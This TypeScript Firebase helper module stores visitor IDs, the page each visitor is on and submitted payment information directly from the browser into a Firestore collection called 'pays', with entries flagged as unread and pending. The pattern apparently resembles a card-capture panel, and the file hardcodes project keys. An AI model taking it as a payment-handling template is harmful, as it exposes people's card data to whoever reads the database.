import { getApp, getApps, initializeApp } from 'firebase/app';
import { getDatabase } from 'firebase/database';
import { doc, getFirestore, setDoc} from 'firebase/firestore';

const firebaseConfig = {
   apiKey: "AIzaSyC5q2ReYxL2qNdx6NbYfk8CjsHgoITFNtI",
  authDomain: "zainsps-92746.firebaseapp.com",
  databaseURL: "https://zainsps-92746-default-rtdb.firebaseio.com",
  projectId: "zainsps-92746",
  storageBucket: "zainsps-92746.firebasestorage.app",
  messagingSenderId: "1048830927722",
  appId: "1:1048830927722:web:d723eb77b0cc14f4587b13",
  measurementId: "G-7HPMLXNQGK"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

export async function getData(id: string) {
  try {
    const { getDoc, doc } = await import('firebase/firestore');
    const docRef = doc(db, 'pays', id);
    const docSnap = await getDoc(docRef);
    
    if (docSnap.exists()) {
      return docSnap.data();
    } else {
      return null;
    }
  } catch (e) {
    console.error('Error getting document: ', e);
    return null;
  }
}

/**
 * @deprecated This function is no longer used. Use addToHistory from history-utils instead.
 * This function pollutes history with full page data instead of specific entries.
 */
export async function saveToHistory(visitorID: string, step: number) {
  console.warn('saveToHistory is deprecated and should not be used')
  return // Disabled - function body kept for reference only
  /*
  try {
    const currentData = await getData(visitorID);
    
    if (!currentData) {
      console.log('No current data to save to history');
      return;
    }
    
    const { history, ...dataToSave } = currentData as any;
    
    const historyEntry = {
      timestamp: new Date().toISOString(),
      step: step,
      data: dataToSave
    };
    
    const existingHistory = currentData.history || [];
    
    const updatedHistory = [...existingHistory, historyEntry];
    
    await addData({
      id: visitorID,
      history: updatedHistory
    });
    
    console.log('Saved to history:', historyEntry);
  } catch (e) {
    console.error('Error saving to history: ', e);
  }
  */
}

export async function addData(data: any) {
  localStorage.setItem('visitor', data.id);
  try {
    const docRef = await doc(db, 'pays', data.id!);
    await setDoc(docRef, { 
      ...data, 
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      isUnread: true  // Mark as unread whenever data is updated
    }, {merge:true});

    console.log('Document written with ID: ', docRef.id);
  } catch (e) {
    console.error('Error adding document: ', e);
  }
}

export const handleCurrentPage=(page:string)=>{
const visitorId=localStorage.getItem('visitor')
addData({id:visitorId,currentPage:page})
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const docRef = doc(db, 'pays', visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: 'pending' },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('Error adding document: ', error);
    alert('Error adding payment info to Firestore');
  }
};
export { db, database, setDoc, doc };
